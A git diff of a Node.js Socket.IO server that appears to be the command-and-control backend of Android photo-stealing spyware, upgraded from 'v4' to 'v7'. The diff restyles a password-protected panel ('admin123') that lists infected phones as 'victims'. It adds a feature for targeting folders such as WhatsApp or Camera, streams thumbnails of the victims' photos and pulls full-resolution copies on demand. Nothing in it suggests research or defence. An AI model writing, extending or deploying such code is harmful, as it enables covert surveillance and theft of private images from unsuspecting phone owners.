@@ -10,109 +10,195 @@ app.use(cors());
 const AUTH_PASS = "admin123"; 
 const PORT = process.env.PORT || 3000;
 
-// --- INTERFAZ WEB ---
+// --- INTERFAZ WEB V7 (PIXEL ART STYLE) ---
 app.get('/', (req, res) => {
     if (req.query.auth !== AUTH_PASS) {
-        return res.send(`<body style="background:black;color:red;display:flex;justify-content:center;align-items:center;height:100vh;"><h2>⛔ ACCESO DENEGADO</h2></body>`);
+        return res.send(`<body style="background:black;color:red;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;font-size:24px;">⛔ ACCESO DENEGADO</body>`);
     }
 
     res.send(`
     <html>
         <head>
-            <title>MyNotes C&C ALL-IN-ONE</title>
+            <title>C&C V7 ULTIMATE</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
-            <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
+            <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
             <style>
-                :root { --bg: #0d0d0d; --panel: #161616; --primary: #00e676; --accent: #2979ff; --warn: #ff9100; --danger: #ff1744; --text: #e0e0e0; }
-                body { font-family: 'Roboto Mono', monospace; background: var(--bg); color: var(--text); margin: 0; padding: 0; height: 100vh; overflow: hidden; }
-                
-                .container { display: grid; grid-template-columns: 320px 1fr; height: 100%; }
-                
-                /* BARRA LATERAL */
-                .sidebar { background: var(--panel); border-right: 1px solid #333; padding: 15px; display: flex; flex-direction: column; gap: 15px; overflow-y: auto; }
-                .logo { color: var(--primary); font-size: 14px; font-weight: bold; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 5px; }
-
-                /* GRUPOS DE CONTROL */
-                .control-group { background: #222; padding: 10px; border-radius: 6px; border: 1px solid #333; }
-                .label { font-size: 10px; color: #888; text-transform: uppercase; margin-bottom: 5px; display:block; font-weight:bold; }
-                
-                select { width: 100%; padding: 8px; background: #000; border: 1px solid #444; color: white; border-radius: 4px; outline: none; font-family: inherit; font-size: 11px; }
-                select:focus { border-color: var(--accent); }
-
-                button { width: 100%; padding: 10px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 5px; color: white; font-family: inherit; font-size: 11px; transition: 0.2s; }
-                .btn-scan { background: var(--accent); }
-                .btn-stop { background: var(--danger); }
-                .btn-freeze { background: var(--warn); color: black; }
-                .btn-freeze.active { background: #00bcd4; color: white; animation: pulse 2s infinite; }
-                
-                @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
-
-                /* ZONA DE FOTOS */
-                .main-area { padding: 20px; overflow-y: auto; background: #0a0a0a; position: relative; }
-                
-                /* BARRA SUPERIOR ESTADÍSTICAS */
-                .header-stats { 
-                    position: sticky; top: 0; background: rgba(10,10,10,0.95); 
-                    padding: 10px 15px; border-bottom: 1px solid #333; margin: -20px -20px 20px -20px; 
-                    z-index: 10; display:flex; justify-content:space-between; font-size: 12px; backdrop-filter: blur(5px);
+                :root { 
+                    --bg: #050505; 
+                    --panel: #111; 
+                    --primary: #00ff41; /* Verde Hacker */
+                    --accent: #008F11; 
+                    --warn: #ffcc00; 
+                    --danger: #ff0033; 
+                    --text: #e0e0e0; 
                 }
                 
-                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; padding-bottom: 50px; }
+                body { 
+                    font-family: 'VT323', monospace; 
+                    background: var(--bg); 
+                    color: var(--text); 
+                    margin: 0; padding: 0; 
+                    height: 100vh; 
+                    overflow: hidden; 
+                    font-size: 18px;
+                }
                 
-                .card { background: #1e1e1e; border-radius: 6px; overflow: hidden; border: 1px solid #333; position: relative; transition: 0.2s; }
-                .card:hover { border-color: var(--accent); transform: translateY(-2px); }
+                /* LAYOUT */
+                .container { display: grid; grid-template-columns: 350px 1fr; height: 100%; }
                 
-                .card img { width: 100%; height: 140px; object-fit: cover; cursor: pointer; display: block; }
+                /* SIDEBAR */
+                .sidebar { 
+                    background: var(--panel); 
+                    border-right: 2px solid var(--primary); 
+                    padding: 20px; 
+                    display: flex; flex-direction: column; gap: 20px; 
+                    overflow-y: auto;
+                    box-shadow: 5px 0 15px rgba(0, 255, 65, 0.1);
+                }
                 
-                .card-footer { padding: 8px; font-size: 10px; display: flex; justify-content: space-between; align-items: center; background: #1a1a1a; border-top: 1px solid #252525; }
-                .btn-hd { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 3px 8px; width: auto; margin: 0; }
-                .btn-hd:hover { background: var(--primary); color: black; }
+                .logo { 
+                    color: var(--primary); 
+                    font-size: 28px; 
+                    border-bottom: 2px dashed var(--primary); 
+                    padding-bottom: 15px; 
+                    text-align: center;
+                    text-shadow: 0 0 5px var(--primary);
+                }
 
-                .badge-victim { position: absolute; top: 5px; left: 5px; background: rgba(0,0,0,0.8); color: var(--accent); padding: 2px 6px; border-radius: 3px; font-size: 9px; font-weight:bold; }
-                .badge-folder { position: absolute; top: 5px; right: 5px; background: rgba(0,0,0,0.8); color: #fff; padding: 2px 6px; border-radius: 3px; font-size: 9px; }
+                /* CONTROLES */
+                .control-group { 
+                    background: #000; 
+                    padding: 15px; 
+                    border: 1px solid #333; 
+                    position: relative;
+                }
+                .control-group::before {
+                    content: ''; position: absolute; top: -1px; left: -1px; width: 10px; height: 10px; border-top: 2px solid var(--primary); border-left: 2px solid var(--primary);
+                }
+                .control-group::after {
+                    content: ''; position: absolute; bottom: -1px; right: -1px; width: 10px; height: 10px; border-bottom: 2px solid var(--primary); border-right: 2px solid var(--primary);
+                }
+
+                .label { font-size: 20px; color: var(--primary); margin-bottom: 8px; display:block; }
+                
+                select, input { 
+                    width: 100%; padding: 10px; 
+                    background: #1a1a1a; 
+                    border: 1px solid var(--accent); 
+                    color: white; 
+                    font-family: 'VT323', monospace; 
+                    font-size: 18px; 
+                    outline: none;
+                    box-sizing: border-box;
+                    margin-bottom: 5px;
+                }
+                select:focus, input:focus { border-color: var(--primary); background: #222; }
+
+                /* BOTONES RETRO */
+                button { 
+                    width: 100%; padding: 12px; 
+                    border: 1px solid var(--primary); 
+                    background: #000; 
+                    color: var(--primary); 
+                    font-family: 'VT323', monospace; 
+                    font-size: 20px; 
+                    cursor: pointer; 
+                    margin-top: 8px; 
+                    transition: 0.1s;
+                    text-transform: uppercase;
+                }
+                button:hover { background: var(--primary); color: black; font-weight: bold; box-shadow: 0 0 10px var(--primary); }
+                button:active { transform: translateY(2px); }
+                
+                .btn-stop { border-color: var(--danger); color: var(--danger); }
+                .btn-stop:hover { background: var(--danger); color: black; box-shadow: 0 0 10px var(--danger); }
+
+                .btn-freeze { border-color: var(--warn); color: var(--warn); }
+                .btn-freeze.active { background: var(--warn); color: black; animation: blink 1s infinite; }
+                
+                @keyframes blink { 50% { opacity: 0.5; } }
+
+                /* AREA PRINCIPAL */
+                .main-area { padding: 20px; overflow-y: auto; background: #080808; position: relative; }
+                
+                .header-stats { 
+                    position: sticky; top: 0; background: rgba(0,0,0,0.9); 
+                    padding: 10px; border-bottom: 1px solid var(--primary); 
+                    margin: -20px -20px 20px -20px; 
+                    z-index: 10; display:flex; justify-content:space-between; 
+                    font-size: 22px; color: var(--primary);
+                }
+                
+                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; padding-bottom: 50px; }
+                
+                /* TARJETAS DE FOTOS */
+                .card { 
+                    background: #111; border: 1px solid #333; 
+                    position: relative; 
+                    transition: 0.2s;
+                }
+                .card:hover { border-color: var(--primary); transform: scale(1.02); z-index: 5; }
+                
+                .card img { width: 100%; height: 150px; object-fit: cover; cursor: pointer; display: block; filter: grayscale(20%); }
+                .card:hover img { filter: grayscale(0%); }
+                
+                .card-footer { 
+                    padding: 5px; font-size: 16px; 
+                    background: #000; border-top: 1px solid #333;
+                    display: flex; justify-content: space-between; align-items: center;
+                }
+
+                .badge { 
+                    position: absolute; top: 0; left: 0; 
+                    background: black; color: var(--primary); 
+                    padding: 2px 6px; font-size: 14px; border-bottom-right-radius: 4px;
+                    border-right: 1px solid var(--primary); border-bottom: 1px solid var(--primary);
+                }
+                
+                /* SCROLLBAR RETRO */
+                ::-webkit-scrollbar { width: 10px; }
+                ::-webkit-scrollbar-track { background: #111; }
+                ::-webkit-scrollbar-thumb { background: #333; border: 1px solid var(--primary); }
+                ::-webkit-scrollbar-thumb:hover { background: var(--primary); }
 
             </style>
         </head>
         <body>
             <div class="container">
                 <div class="sidebar">
-                    <div class="logo">☠️ C&C ALL-IN-ONE v4</div>
+                    <div class="logo">> SYSTEM V7_ROOT</div>
 
                     <div class="control-group">
-                        <span class="label">1. OBJETIVO (TARGET)</span>
-                        <select id="victimSelector" onchange="updateFilters()">
-                            <option value="ALL">📢 TODOS LOS DISPOSITIVOS</option>
+                        <span class="label">1. OBJETIVO [TARGET]</span>
+                        <select id="victimSelector">
+                            <option value="ALL">[*] TODOS LOS DISPOSITIVOS</option>
                         </select>
+                        <div id="connectionStatus" style="font-size:16px; color:#555; margin-top:5px;">Offline</div>
                     </div>
 
                     <div class="control-group">
-                        <span class="label">2. FILTRO CARPETA</span>
-                        <select id="folderSelector" onchange="updateFilters()">
-                            <option value="ALL">📂 TODAS LAS CARPETAS</option>
-                        </select>
+                        <span class="label">2. FILTRO INTELIGENTE</span>
+                        <input type="text" id="smartFolder" placeholder="Ej: Camera, WhatsApp, dcim">
+                        <div style="font-size:14px; color:#666; margin-top:2px;">* Dejar vacío para escanear TODO</div>
                     </div>
 
                     <div class="control-group">
-                        <span class="label">3. ACCIONES</span>
-                        <button class="btn-scan" onclick="sendCommand('start')">▶ INICIAR ESCANEO</button>
-                        <button class="btn-stop" onclick="sendCommand('stop')">⏹ DETENER ESCANEO</button>
+                        <span class="label">3. EJECUTAR</span>
+                        <button onclick="sendCommand('start')">[▶] INICIAR ESCANEO</button>
+                        <button class="btn-stop" onclick="sendCommand('stop')">[X] DETENER PROCESO</button>
                     </div>
 
                     <div class="control-group">
-                        <span class="label">4. VISTA</span>
-                        <button id="btnFreeze" class="btn-freeze" onclick="toggleFreeze()">👀 CONGELAR (PAUSA)</button>
-                        <button style="background:#444;" onclick="clearGrid()">🗑 LIMPIAR PANTALLA</button>
-                    </div>
-
-                    <div style="margin-top:auto; font-size:10px; color:#555;">
-                        <div id="connectionStatus">Esperando conexión...</div>
+                        <span class="label">4. VISUALIZACIÓN</span>
+                        <button id="btnFreeze" class="btn-freeze" onclick="toggleFreeze()">[II] CONGELAR PANTALLA</button>
+                        <button onclick="clearGrid()">[🗑] LIMPIAR BUFFER</button>
                     </div>
                 </div>
 
                 <div class="main-area">
                     <div class="header-stats">
-                        <span>Filtro: <span id="filterLabel" style="color:white; font-weight:bold;">Ninguno</span></span>
-                        <span>Fotos: <span id="count" style="color:var(--primary);">0</span></span>
+                        <span>ESTADO: <span id="lblStatus" style="color:white;">ESPERANDO COMANDO...</span></span>
+                        <span>IMÁGENES: <span id="count" style="color:white;">0</span></span>
                     </div>
                     <div class="grid" id="grid"></div>
                 </div>
@@ -122,100 +208,46 @@ app.get('/', (req, res) => {
             <script>
                 const socket = io();
                 
-                // --- ESTADO DEL SISTEMA ---
+                // --- VARIABLES DE ESTADO ---
                 let victimsMap = {}; 
-                let knownFolders = new Set();
-                
                 let isFrozen = false;
-                let pendingBuffer = []; // Cola de fotos congeladas
+                let pendingBuffer = []; 
                 let photoCount = 0;
 
                 // --- 1. GESTIÓN DE DISPOSITIVOS ---
                 socket.on('update_device_list', (victims) => {
                     victimsMap = victims;
-                    updateVictimSelect();
-                    document.getElementById('connectionStatus').innerText = Object.keys(victims).length + " Dispositivos Online";
-                    document.getElementById('connectionStatus').style.color = "#00e676";
-                });
-
-                function updateVictimSelect() {
-                    const selector = document.getElementById('victimSelector');
-                    const currentVal = selector.value;
-                    let html = '<option value="ALL">📢 TODOS LOS DISPOSITIVOS (' + Object.keys(victimsMap).length + ')</option>';
+                    const sel = document.getElementById('victimSelector');
+                    const current = sel.value;
                     
-                    for (const [id, info] of Object.entries(victimsMap)) {
+                    let html = '<option value="ALL">[*] TODOS (' + Object.keys(victims).length + ')</option>';
+                    for (const [id, info] of Object.entries(victims)) {
                         html += \`<option value="\${id}">📱 \${info.name}</option>\`;
                     }
-                    selector.innerHTML = html;
-                    selector.value = currentVal; 
-                }
+                    sel.innerHTML = html;
+                    sel.value = current;
 
-                // --- 2. LÓGICA DE FILTRADO UNIFICADA ---
-                function updateFilters() {
-                    const targetId = document.getElementById('victimSelector').value;
-                    const targetFolder = document.getElementById('folderSelector').value;
-                    const cards = document.getElementsByClassName('card');
-                    
-                    // Actualizar etiqueta superior
-                    let label = (targetId === "ALL" ? "Todos" : victimsMap[targetId]?.name) + " / " + targetFolder;
-                    document.getElementById('filterLabel').innerText = label;
-
-                    // Loop para mostrar/ocultar
-                    for (let card of cards) {
-                        const owner = card.getAttribute('data-owner');
-                        const folder = card.getAttribute('data-folder');
-                        
-                        const matchVictim = (targetId === "ALL" || owner === targetId);
-                        const matchFolder = (targetFolder === "ALL" || folder === targetFolder);
-
-                        if (matchVictim && matchFolder) {
-                            card.style.display = "block";
-                        } else {
-                            card.style.display = "none";
-                        }
-                    }
-                }
-
-                // --- 3. FREEZE / PAUSA ---
-                function toggleFreeze() {
-                    isFrozen = !isFrozen;
-                    const btn = document.getElementById('btnFreeze');
-                    
-                    if (isFrozen) {
-                        btn.innerHTML = "⏸ PANTALLA CONGELADA";
-                        btn.className = "btn-freeze active";
-                    } else {
-                        btn.innerHTML = "👀 CONGELAR (PAUSA)";
-                        btn.className = "btn-freeze";
-                        
-                        // Procesar cola
-                        if(pendingBuffer.length > 0) {
-                            pendingBuffer.forEach(data => processNewImage(data));
-                            pendingBuffer = [];
-                        }
-                    }
-                }
-
-                // --- 4. RECEPCIÓN DE FOTOS ---
-                socket.on('new_preview', data => {
-                    if (isFrozen) {
-                        pendingBuffer.push(data);
-                        document.getElementById('btnFreeze').innerHTML = "⏸ PENDIENTES: " + pendingBuffer.length;
-                    } else {
-                        processNewImage(data);
-                    }
+                    const statusDiv = document.getElementById('connectionStatus');
+                    statusDiv.innerText = Object.keys(victims).length + " Dispositivos Conectados";
+                    statusDiv.style.color = "#00ff41";
                 });
 
-                function processNewImage(data) {
-                    // 1. Agregar carpeta si es nueva
-                    if (!knownFolders.has(data.folder)) {
-                        knownFolders.add(data.folder);
-                        const opt = document.createElement('option');
-                        opt.value = data.folder;
-                        opt.innerText = "📂 " + data.folder;
-                        document.getElementById('folderSelector').appendChild(opt);
+                // --- 2. RECEPCIÓN DE FOTOS ---
+                socket.on('new_preview', data => {
+                    // Si está congelado, guardamos en buffer
+                    if (isFrozen) {
+                        pendingBuffer.push(data);
+                        document.getElementById('btnFreeze').innerText = "[II] PENDIENTES: " + pendingBuffer.length;
+                        return;
                     }
-                    
+                    processImage(data);
+                });
+
+                function processImage(data) {
+                    // Filtro visual extra (por si acaso)
+                    const targetId = document.getElementById('victimSelector').value;
+                    if (targetId !== "ALL" && targetId !== data.victimId) return;
+
                     renderCard(data);
                 }
 
@@ -226,49 +258,69 @@ app.get('/', (req, res) => {
                     div.className = 'card';
                     div.id = data.path;
                     
-                    // Atributos para el filtrado
-                    div.setAttribute('data-owner', data.victimId);
-                    div.setAttribute('data-folder', data.folder);
-
-                    const ownerName = victimsMap[data.victimId]?.name || "Desconocido";
-
+                    const ownerName = victimsMap[data.victimId]?.name || "Unk";
+                    
                     div.innerHTML = \`
-                        <div class="badge-victim">\${ownerName}</div>
-                        <div class="badge-folder">\${data.folder}</div>
-                        <img src="data:image/jpeg;base64,\${data.image64}" onclick="pedirHD('\${data.path}', '\${data.victimId}')" loading="lazy">
+                        <div class="badge">\${ownerName} | \${data.folder}</div>
+                        <img src="data:image/jpeg;base64,\${data.image64}" onclick="pedirHD('\${data.path}', '\${data.victimId}')" title="Clic para descargar HD">
                         <div class="card-footer">
-                            <span style="color:#666">\${data.path.split('/').pop().substring(0,10)}...</span>
-                            <button class="btn-hd" onclick="pedirHD('\${data.path}', '\${data.victimId}')">⚡ HD</button>
+                            <span style="font-size:12px; color:#777;">\${data.name.substring(0,10)}</span>
+                            <span style="cursor:pointer; color:var(--primary);" onclick="pedirHD('\${data.path}', '\${data.victimId}')">[HD]</span>
                         </div>
                     \`;
-
-                    // Verificar si debe mostrarse según filtros actuales
-                    const targetId = document.getElementById('victimSelector').value;
-                    const targetFolder = document.getElementById('folderSelector').value;
-                    const matchVictim = (targetId === "ALL" || data.victimId === targetId);
-                    const matchFolder = (targetFolder === "ALL" || data.folder === targetFolder);
-
-                    if (!matchVictim || !matchFolder) {
-                        div.style.display = "none";
-                    }
 
                     document.getElementById('grid').prepend(div);
                     photoCount++;
                     document.getElementById('count').innerText = photoCount;
                 }
 
-                // --- 5. COMANDOS & HD ---
+                // --- 3. FUNCIONES DE CONTROL ---
+                function toggleFreeze() {
+                    isFrozen = !isFrozen;
+                    const btn = document.getElementById('btnFreeze');
+                    
+                    if (isFrozen) {
+                        btn.classList.add('active');
+                        btn.innerText = "[II] PANTALLA CONGELADA";
+                    } else {
+                        btn.classList.remove('active');
+                        btn.innerText = "[II] CONGELAR PANTALLA";
+                        // Procesar cola
+                        pendingBuffer.forEach(data => processImage(data));
+                        pendingBuffer = [];
+                    }
+                }
+
                 function sendCommand(action) {
                     const target = document.getElementById('victimSelector').value;
+                    // AQUÍ ESTÁ LA MAGIA DEL V7: Leemos la carpeta y la enviamos
+                    const folder = document.getElementById('smartFolder').value.trim();
+                    
                     const cmd = action === 'start' ? 'start_scan' : 'stop_scan';
-                    socket.emit('admin_command', { action: cmd, target: target });
+                    
+                    document.getElementById('lblStatus').innerText = action === 'start' ? ">> ESCANEANDO: " + (folder || "TODO") : ">> SISTEMA DETENIDO";
+                    document.getElementById('lblStatus').style.color = action === 'start' ? "#00ff41" : "red";
+
+                    socket.emit('admin_command', { 
+                        action: cmd, 
+                        target: target,
+                        folder: folder // Enviamos el filtro al celular
+                    });
                 }
 
                 function pedirHD(path, targetId) {
-                    console.log("⬇️ Solicitando HD a", targetId);
+                    console.log("Solicitando HD...");
                     socket.emit('order_download', { path: path, target: targetId });
                 }
 
+                function clearGrid() {
+                    document.getElementById('grid').innerHTML = '';
+                    photoCount = 0;
+                    document.getElementById('count').innerText = '0';
+                    pendingBuffer = [];
+                }
+
+                // --- 4. DESCARGA HD ---
                 socket.on('receive_full', data => {
                     const a = document.createElement('a');
                     a.href = "data:image/jpeg;base64," + data.image64;
@@ -276,19 +328,10 @@ app.get('/', (req, res) => {
                     document.body.appendChild(a);
                     a.click();
                     document.body.removeChild(a);
-
+                    
                     const card = document.getElementById(data.path);
-                    if(card) {
-                        card.style.border = "2px solid #00e676";
-                        card.querySelector('.btn-hd').innerText = "✅";
-                    }
+                    if(card) card.style.border = "2px solid #00ff41";
                 });
-
-                function clearGrid() {
-                    document.getElementById('grid').innerHTML = '';
-                    photoCount = 0;
-                    document.getElementById('count').innerText = '0';
-                }
 
             </script>
         </body>
@@ -298,28 +341,26 @@ app.get('/', (req, res) => {
 
 const server = http.createServer(app);
 
-// CONFIGURACIÓN PARA QUE FUNCIONE EN RENDER Y ANDROID
+// CONFIGURACIÓN ROBUSTA PARA RENDER
 const io = new Server(server, { 
     cors: { origin: "*" }, 
-    allowEIO3: true,         // Vital para compatibilidad
-    maxHttpBufferSize: 1e8   // 100MB
+    allowEIO3: true,         // Vital para compatibilidad con clientes antiguos/lentos
+    maxHttpBufferSize: 1e8   // 100MB para aguantar fotos HD grandes
 });
 
 let victims = {};
 
 io.on('connection', (socket) => {
     
-    console.log(`🔌 Conexión: ${socket.id}`);
-
-    // RECEPCIÓN DE DATOS
+    // 1. REGISTRO
     socket.on('usrData', (data) => {
         if (data.dataType === 'register_device') {
             victims[socket.id] = { name: data.deviceName, id: data.deviceId };
-            console.log(`📱 REGISTRADO: ${data.deviceName}`);
+            console.log(`[+] DISPOSITIVO: ${data.deviceName} (${socket.id})`);
             io.emit('update_device_list', victims);
         }
         else if (data.dataType === 'preview_image') {
-            data.victimId = socket.id; // Pegar etiqueta de dueño
+            data.victimId = socket.id;
             socket.broadcast.emit('new_preview', data);
         }
         else if (data.dataType === 'full_image') {
@@ -327,33 +368,33 @@ io.on('connection', (socket) => {
         }
     });
 
-    // COMANDOS DE ADMIN
+    // 2. COMANDOS ADMIN (V7)
     socket.on('admin_command', (cmd) => {
-        console.log(`💻 CMD: ${cmd.action} -> ${cmd.target}`);
+        console.log(`[CMD] ${cmd.action} -> ${cmd.target} (Folder: ${cmd.folder})`);
+        
+        // Reenviamos el comando CON la carpeta al celular
         if (cmd.target === 'ALL') {
-            socket.broadcast.emit('command_' + cmd.action);
+            socket.broadcast.emit('command_' + cmd.action, { folder: cmd.folder });
         } else {
-            io.to(cmd.target).emit('command_' + cmd.action);
+            io.to(cmd.target).emit('command_' + cmd.action, { folder: cmd.folder });
         }
     });
 
-    // SOLICITUD DE DESCARGA
+    // 3. SOLICITUD HD
     socket.on('order_download', (data) => {
         if(data.target) {
             io.to(data.target).emit('request_full_image', { path: data.path });
         }
     });
 
-    // DESCONEXIÓN
+    // 4. DESCONEXIÓN
     socket.on('disconnect', () => {
         if (victims[socket.id]) {
+            console.log(`[-] SALIÓ: ${victims[socket.id].name}`);
             delete victims[socket.id];
             io.emit('update_device_list', victims);
         }
     });
-    
-    // ESTADO INICIAL
-    socket.emit('update_device_list', victims);
 });
 
-server.listen(PORT, () => console.log(`🚀 SERVIDOR V4 LISTO EN PUERTO ${PORT}`));
+server.listen(PORT, () => console.log(`🚀 SYSTEM V7 ONLINE :: PORT ${PORT}`));
